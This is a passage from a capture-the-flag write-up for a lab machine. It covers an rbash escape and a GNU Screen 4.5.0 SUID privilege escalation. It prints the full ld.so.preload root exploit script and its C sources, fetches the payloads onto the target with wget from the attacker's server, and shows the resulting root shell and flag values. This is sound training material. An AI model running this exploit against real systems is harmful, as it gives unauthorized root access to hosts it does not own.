                    </ul>
                  </li>
                  <li><code class="highlighter-rouge">chmod</code> uses <strong>octal values</strong> for user, group, global, and other permissions
                    <ul>
                      <li>The <strong>octal value</strong> for <code class="highlighter-rouge">-r--r--r--</code> is <strong>0444</strong></li>
                      <li>In decimal (or integer value), <strong>0444</strong> is <strong>292</strong></li>
                    </ul>
                  </li>
                </ul>
              </li>
            </ol>
          </li>
        </ol>
      </li>
    </ol>
  </li>
  <li>Reconnect to 10.10.10.124 via <code class="highlighter-rouge">ssh</code>:
    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">chmod 400 .ssh/id_rsa

ssh -i .ssh/id_rsa -l sysadm 10.10.10.124
</span></code></pre></div>    </div>
    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Enter passphrase for key '.ssh/id_rsa': flujab
</code></pre></div>    </div>
    <ul>
      <li>While inside <code class="highlighter-rouge">sysadm</code> shell:
        <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">cd
</span><span class="gp">#</span><span class="w"> </span><span class="nt">-rbash</span>: <span class="nb">cd</span>: restricted
</code></pre></div>        </div>
      </li>
      <li>Escape the <code class="highlighter-rouge">rbash</code>:
        <ol>
          <li>Test commands that you can use:
            <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">python --version
</span><span class="gp">#</span><span class="w"> </span>Python 2.7.13
</code></pre></div>            </div>
            <p><strong>NOTE(S)</strong>:</p>
            <ul>
              <li>The shell accepts <code class="highlighter-rouge">python</code> instructions</li>
            </ul>
          </li>
          <li>Leverage <code class="highlighter-rouge">python</code>:
            <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">python -c 'import pty;</span><span class="w"> </span>pty.spawn<span class="o">(</span><span class="s2">"/bin/bash"</span><span class="o">)</span><span class="s1">'
</span></code></pre></div>            </div>
          </li>
        </ol>
      </li>
    </ul>
  </li>
</ol>

<hr />

<h2 id="part-4--attempt-privilege-escalation-sysadm---root">PART 4 : Attempt Privilege Escalation (sysadm -&gt; root)</h2>

<ol>
  <li>Check for <strong>SUID files</strong> owned by <code class="highlighter-rouge">root</code>:
    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">find / -uid 0 -perm -4000 -type f 2&gt;</span>/dev/null
<span class="gp">#</span><span class="w"> </span>...
<span class="gp">#</span><span class="w"> </span>/usr/local/share/screen/screen
<span class="gp">#</span><span class="w"> </span>...
<span class="gp">#</span><span class="w"> </span>/usr/bin/screen
<span class="gp">#</span><span class="w"> </span>...
</code></pre></div>    </div>
    <p><strong>NOTE(S)</strong>:</p>
    <ul>
      <li>There are two binaries with the same name (<code class="highlighter-rouge">screen</code>)</li>
      <li><code class="highlighter-rouge">screen</code> can write files to the system using its <code class="highlighter-rouge">-L</code> option
        <ul>
          <li><strong><em>logfiles</em></strong> will be written as <strong>root</strong></li>
        </ul>
      </li>
    </ul>
  </li>
  <li>Check the binary version:
    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">/usr/local/share/screen/screen -v
</span><span class="gp">#</span><span class="w"> </span>Screen version 4.05.00 <span class="o">(</span>GNU<span class="o">)</span> 10-Dec-16
<span class="go">
/usr/bin/screen -v
</span><span class="gp">#</span><span class="w"> </span>Screen version 4.05.00 <span class="o">(</span>GNU<span class="o">)</span> 10-Dec-16
<span class="go">
</span><span class="gp">echo $</span>PATH
<span class="gp">#</span><span class="w"> </span>/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
</code></pre></div>    </div>
    <p><strong>NOTE(S)</strong>:</p>
    <ul>
      <li>Both are running <code class="highlighter-rouge">version 4.05.00</code></li>
      <li><code class="highlighter-rouge">/usr/local/share</code> is not in the <code class="highlighter-rouge">PATH</code> variable</li>
      <li><code class="highlighter-rouge">/usr/local/share</code> is a hidden binary with an SUID bit</li>
    </ul>
  </li>
  <li>Search for available exploits:
    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">searchsploit screen | grep 4.5
</span><span class="gp">#</span><span class="w"> </span>GNU Screen 4.5.0 - Local Privilege Escalation            | exploits/linux/local/41154.sh
<span class="gp">#</span><span class="w"> </span>GNU Screen 4.5.0 - Local Privilege Escalation <span class="o">(</span>PoC<span class="o">)</span>      | exploits/linux/local/41152.txt
<span class="go">
searchsploit -m exploits/linux/local/41154.sh
</span><span class="gp">#</span><span class="w">   </span>Exploit: GNU Screen 4.5.0 - Local Privilege Escalation
<span class="gp">#</span><span class="w">       </span>URL: https://www.exploit-db.com/exploits/41154
<span class="gp">#</span><span class="w">      </span>Path: /usr/share/exploitdb/exploits/linux/local/41154.sh
<span class="gp">#</span><span class="w"> </span>File Type: Bourne-Again shell script, ASCII text executable, with CRLF line terminators
</code></pre></div>    </div>
    <ul>
      <li><strong>41154.sh</strong>:
        <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
<span class="c"># screenroot.sh</span>
<span class="c"># setuid screen v4.5.0 local root exploit</span>
<span class="c"># abuses ld.so.preload overwriting to get root.</span>
<span class="c"># bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html</span>
<span class="c"># HACK THE PLANET</span>
<span class="c"># ~ infodox (25/1/2017) </span>
<span class="nb">echo</span> <span class="s2">"~ gnu/screenroot ~"</span>
<span class="nb">echo</span> <span class="s2">"[+] First, we create our shell and library..."</span>
<span class="nb">cat</span> <span class="o">&lt;&lt;</span> <span class="no">EOF</span><span class="sh"> &gt; /tmp/libhax.c
#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!</span><span class="se">\n</span><span class="sh">");
}
</span><span class="no">EOF
</span>gcc <span class="nt">-fPIC</span> <span class="nt">-shared</span> <span class="nt">-ldl</span> <span class="nt">-o</span> /tmp/libhax.so /tmp/libhax.c
<span class="nb">rm</span> <span class="nt">-f</span> /tmp/libhax.c
<span class="nb">cat</span> <span class="o">&lt;&lt;</span> <span class="no">EOF</span><span class="sh"> &gt; /tmp/rootshell.c
#include &lt;stdio.h&gt;
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
</span><span class="no">EOF
</span>gcc <span class="nt">-o</span> /tmp/rootshell /tmp/rootshell.c
<span class="nb">rm</span> <span class="nt">-f</span> /tmp/rootshell.c
<span class="nb">echo</span> <span class="s2">"[+] Now we create our /etc/ld.so.preload file..."</span>
<span class="nb">cd</span> /etc
<span class="nb">umask </span>000 <span class="c"># because</span>
screen <span class="nt">-D</span> <span class="nt">-m</span> <span class="nt">-L</span> ld.so.preload <span class="nb">echo</span> <span class="nt">-ne</span>  <span class="s2">"</span><span class="se">\x</span><span class="s2">0a/tmp/libhax.so"</span> <span class="c"># newline needed</span>
<span class="nb">echo</span> <span class="s2">"[+] Triggering..."</span>
screen <span class="nt">-ls</span> <span class="c"># screen itself is setuid, so... </span>
/tmp/rootshell
</code></pre></div>        </div>
        <p><strong>NOTE(S)</strong></p>
        <ul>
          <li><code class="highlighter-rouge">screen</code> is used to write to the <code class="highlighter-rouge">/etc</code> directory as <strong>root</strong></li>
          <li>The exploit creates two files ‚Äì <code class="highlighter-rouge">libhax.c</code> and <code class="highlighter-rouge">rootshell.c</code></li>
          <li><code class="highlighter-rouge">libhax.c</code> is compiled as a <strong><em>shared object</em></strong> file (<code class="highlighter-rouge">libhax.so</code>)
            <ul>
              <li><code class="highlighter-rouge">libhax.so</code> gives <strong>SUID root</strong> permissions to <code class="highlighter-rouge">/tmp/rootshell</code></li>
              <li><code class="highlighter-rouge">libhax.so</code> is wriiten to <code class="highlighter-rouge">/etc/ld.so.preload</code></li>
              <li><strong><em>shared objects</em></strong> in <code class="highlighter-rouge">/etc/ld.so.preload</code> are loaded before everything else</li>
            </ul>
          </li>
          <li><code class="highlighter-rouge">rootshell.c</code> is compiled as an executable (<code class="highlighter-rouge">rootshell</code>)</li>
        </ul>
      </li>
    </ul>
  </li>
  <li>Enumerate the system using <code class="highlighter-rouge">sysadm</code> shell:
    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">uname -a
</span><span class="gp">#</span><span class="w"> </span>Linux flujab 4.9.0-8-amd64 <span class="c">#1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux</span>
<span class="go">
gcc
</span><span class="gp">#</span><span class="w"> </span>bash: gcc: <span class="nb">command </span>not found
</code></pre></div>    </div>
    <p><strong>NOTE(S)</strong>:</p>
    <ul>
      <li>The system runs on a 64-bit architecture</li>
      <li><code class="highlighter-rouge">gcc</code> is not available in the system</li>
    </ul>
  </li>
  <li>Create and compile <code class="highlighter-rouge">libhax.c</code> and <code class="highlighter-rouge">rootshell.c</code> locally:
    <ol>
      <li>Create <code class="highlighter-rouge">libhax.c</code>:
        <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">vim libhax.c
</span></code></pre></div>        </div>
        <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;
</span><span class="n">__attribute__</span> <span class="p">((</span><span class="n">__constructor__</span><span class="p">))</span>
<span class="kt">void</span> <span class="nf">dropshell</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
    <span class="n">chown</span><span class="p">(</span><span class="s">"/tmp/rootshell"</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">chmod</span><span class="p">(</span><span class="s">"/tmp/rootshell"</span><span class="p">,</span> <span class="mo">04755</span><span class="p">);</span>
    <span class="n">unlink</span><span class="p">(</span><span class="s">"/etc/ld.so.preload"</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] done!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>        </div>
        <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>:wq
</code></pre></div>        </div>
      </li>
      <li>Create <code class="highlighter-rouge">rootshell.c</code>:
        <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">vim rootshell.c
</span></code></pre></div>        </div>
        <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
</span><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
    <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="n">seteuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="n">setegid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="n">execvp</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>        </div>
        <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>:wq
</code></pre></div>        </div>
      </li>
      <li>Compile the binaries:
        <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">gcc -fPIC -shared -ldl -o libhax.so libhax.c
</span><span class="gp">#</span><span class="w"> </span>libhax.c: In <span class="k">function</span> ‚Äòdropshell‚Äô:
<span class="gp">#</span><span class="w"> </span>libhax.c:7:5: warning: implicit declaration of <span class="k">function</span> ‚Äòchmod‚Äô<span class="p">;</span> did you mean ‚Äòchroot‚Äô? <span class="o">[</span><span class="nt">-Wimplicit-function-declaration</span><span class="o">]</span>
<span class="gp">#</span><span class="w">      </span><span class="nb">chmod</span><span class="o">(</span><span class="s2">"/tmp/rootshell"</span>, 04755<span class="o">)</span><span class="p">;</span>
<span class="gp">#</span><span class="w">      </span>^~~~~
<span class="gp">#</span><span class="w">      </span><span class="nb">chroot</span>
<span class="go">
gcc -o rootshell rootshell.c
</span><span class="gp">#</span><span class="w"> </span>rootshell.c: In <span class="k">function</span> ‚Äòmain‚Äô:
<span class="gp">#</span><span class="w"> </span>rootshell.c:3:5: warning: implicit declaration of <span class="k">function</span> ‚Äòsetuid‚Äô<span class="p">;</span> did you mean ‚Äòsetbuf‚Äô? <span class="o">[</span><span class="nt">-Wimplicit-function-declaration</span><span class="o">]</span>
<span class="gp">#</span><span class="w">      </span>setuid<span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
<span class="gp">#</span><span class="w">      </span>^~~~~~
<span class="gp">#</span><span class="w">      </span>setbuf
<span class="gp">#</span><span class="w"> </span>rootshell.c:4:5: warning: implicit declaration of <span class="k">function</span> ‚Äòsetgid‚Äô<span class="p">;</span> did you mean ‚Äòsetbuf‚Äô? <span class="o">[</span><span class="nt">-Wimplicit-function-declaration</span><span class="o">]</span>
<span class="gp">#</span><span class="w">      </span>setgid<span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
<span class="gp">#</span><span class="w">      </span>^~~~~~
<span class="gp">#</span><span class="w">      </span>setbuf
<span class="gp">#</span><span class="w"> </span>rootshell.c:5:5: warning: implicit declaration of <span class="k">function</span> ‚Äòseteuid‚Äô<span class="p">;</span> did you mean ‚Äòsetbuf‚Äô? <span class="o">[</span><span class="nt">-Wimplicit-function-declaration</span><span class="o">]</span>
<span class="gp">#</span><span class="w">      </span>seteuid<span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
<span class="gp">#</span><span class="w">      </span>^~~~~~~
<span class="gp">#</span><span class="w">      </span>setbuf
<span class="gp">#</span><span class="w"> </span>rootshell.c:6:5: warning: implicit declaration of <span class="k">function</span> ‚Äòsetegid‚Äô <span class="o">[</span><span class="nt">-Wimplicit-function-declaration</span><span class="o">]</span>
<span class="gp">#</span><span class="w">      </span>setegid<span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
<span class="gp">#</span><span class="w">      </span>^~~~~~~
<span class="gp">#</span><span class="w"> </span>rootshell.c:7:5: warning: implicit declaration of <span class="k">function</span> ‚Äòexecvp‚Äô <span class="o">[</span><span class="nt">-Wimplicit-function-declaration</span><span class="o">]</span>
<span class="gp">#</span><span class="w">      </span>execvp<span class="o">(</span><span class="s2">"/bin/sh"</span>, NULL, NULL<span class="o">)</span><span class="p">;</span>
<span class="gp">#</span><span class="w">      </span>^~~~~~
</code></pre></div>        </div>
      </li>
    </ol>
  </li>
  <li>Upload the binaries to the <code class="highlighter-rouge">sysadm</code> shell:
    <ul>
      <li>Local terminal:
        <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">python -m SimpleHTTPServer
</span></code></pre></div>        </div>
      </li>
      <li><code class="highlighter-rouge">sysadm</code> shell:
        <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd /tmp

wget http://10.10.15.10:8000/libhax.so
# libhax.so           100%[===================&gt;]  15.76K  62.6KB/s    in 0.3s

wget http://10.10.15.10:8000/rootshell
# rootshell           100%[===================&gt;]  16.43K  52.1KB/s    in 0.3s    
</code></pre></div>        </div>
      </li>
    </ul>
  </li>
  <li>Execute the exploit:
    <ul>
      <li><code class="highlighter-rouge">sysadm</code> shell:
        <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">chmod +x /tmp/rootshell

cd /etc

umask 000

/usr/local/share/screen/screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"

/usr/local/share/screen/screen -ls
</span><span class="gp">#</span><span class="w"> </span>No Sockets found <span class="k">in</span> /tmp/screens/S-sysadm.
<span class="go">
/tmp/rootshell
</span></code></pre></div>        </div>
      </li>
      <li>While inside <code class="highlighter-rouge">root</code> shell:
        <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">id
</span><span class="gp">#</span><span class="w"> </span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1007<span class="o">(</span>sysadm<span class="o">)</span>
<span class="go">
cat /root/root.txt
</span><span class="gp">#</span><span class="w"> </span>7081748f80e8ec0c02ddbf0c96daee33
<span class="go">     
find /home -name user.txt
</span><span class="gp">#</span><span class="w"> </span>/home/drno/user.txt
<span class="gp">#</span><span class="w"> </span>/home/drme/user.txt
<span class="gp">#</span><span class="w"> </span>/home/nursemoe/user.txt
<span class="gp">#</span><span class="w"> </span>/home/drshipman/user.txt
<span class="gp">#</span><span class="w"> </span>/home/drstrange/user.txt
<span class="gp">#</span><span class="w"> </span>/home/drsmith/user.txt
<span class="gp">#</span><span class="w"> </span>/home/nursewhitstone/user.txt
<span class="gp">#</span><span class="w"> </span>/home/nursewalters/user.txt
<span class="gp">#</span><span class="w"> </span>/home/drgreene/user.txt
<span class="gp">#</span><span class="w"> </span>/home/drstones/user.txt
<span class="gp">#</span><span class="w"> </span>/home/drre/user.txt
<span class="gp">#</span><span class="w"> </span>/home/drwho/user.txt
<span class="gp">#</span><span class="w"> </span>/home/nurseyi/user.txt
<span class="gp">#</span><span class="w"> </span>/home/drjones/user.txt
<span class="gp">#</span><span class="w"> </span>/home/nursejackie/user.txt
<span class="gp">#</span><span class="w"> </span>/home/nursewaters/user.txt
<span class="gp">#</span><span class="w"> </span>/home/nursebluecoats/user.txt
<span class="gp">#</span><span class="w"> </span>/home/drblack/user.txt
<span class="gp">#</span><span class="w"> </span>/home/nursepeter/user.txt
<span class="gp">#</span><span class="w"> </span>/home/drpo/user.txt
<span class="gp">#</span><span class="w"> </span>/home/drwhite/user.txt
<span class="gp">#</span><span class="w"> </span>/home/drcrick/user.txt
<span class="gp">#</span><span class="w"> </span>/home/nursetumble/user.txt
<span class="gp">#</span><span class="w"> </span>/home/dryi/user.txt
<span class="gp">#</span><span class="w"> </span>/home/drnu/user.txt
<span class="gp">#</span><span class="w"> </span>/home/drdre/user.txt
<span class="gp">#</span><span class="w"> </span>/home/drfoster/user.txt
<span class="go">     
cat /home/*/user.txt
</span><span class="gp">#</span><span class="w"> </span>This is A Nope <span class="o">!!!</span> :P           
<span class="gp">#</span><span class="w"> </span>This is A Nope <span class="o">!!!</span> :P           
<span class="gp">#</span><span class="w"> </span>This is A Nope <span class="o">!!!</span> :P           
<span class="gp">#</span><span class="w"> </span>This is A Nope <span class="o">!!!</span> :P           
<span class="gp">#</span><span class="w"> </span>This is A Nope <span class="o">!!!</span> :P           
<span class="gp">#</span><span class="w"> </span>This is A Nope <span class="o">!!!</span> :P           
<span class="gp">#</span><span class="w"> </span>This is A Nope <span class="o">!!!</span> :P           
<span class="gp">#</span><span class="w"> </span>c519aa2fa8c2b69eb3891d8d46c662d4
<span class="gp">#</span><span class="w"> </span>This is A Nope <span class="o">!!!</span> :P           
<span class="gp">#</span><span class="w"> </span>This is A Nope <span class="o">!!!</span> :P           
<span class="gp">#</span><span class="w"> </span>This is A Nope <span class="o">!!!</span> :P           
<span class="gp">#</span><span class="w"> </span>This is A Nope <span class="o">!!!</span> :P           
<span class="gp">#</span><span class="w"> </span>This is A Nope <span class="o">!!!</span> :P           
<span class="gp">#</span><span class="w"> </span>This is A Nope <span class="o">!!!</span> :P           
<span class="gp">#</span><span class="w"> </span>This is A Nope <span class="o">!!!</span> :P           
<span class="gp">#</span><span class="w"> </span>This is A Nope <span class="o">!!!</span> :P           
<span class="gp">#</span><span class="w"> </span>This is A Nope <span class="o">!!!</span> :P           
<span class="gp">#</span><span class="w"> </span>This is A Nope <span class="o">!!!</span> :P           
<span class="gp">#</span><span class="w"> </span>This is A Nope <span class="o">!!!</span> :P           
<span class="gp">#</span><span class="w"> </span>This is A Nope <span class="o">!!!</span> :P           
<span class="gp">#</span><span class="w"> </span>This is A Nope <span class="o">!!!</span> :P           
<span class="gp">#</span><span class="w"> </span>This is A Nope <span class="o">!!!</span> :P           
<span class="gp">#</span><span class="w"> </span>This is A Nope <span class="o">!!!</span> :P           
<span class="gp">#</span><span class="w"> </span>This is A Nope <span class="o">!!!</span> :P           
<span class="gp">#</span><span class="w"> </span>This is A Nope <span class="o">!!!</span> :P           
<span class="gp">#</span><span class="w"> </span>This is A Nope <span class="o">!!!</span> :P           
<span class="gp">#</span><span class="w"> </span>This is A Nope <span class="o">!!!</span> :P
</code></pre></div>        </div>
      </li>
    </ul>
  </li>
</ol>
:ET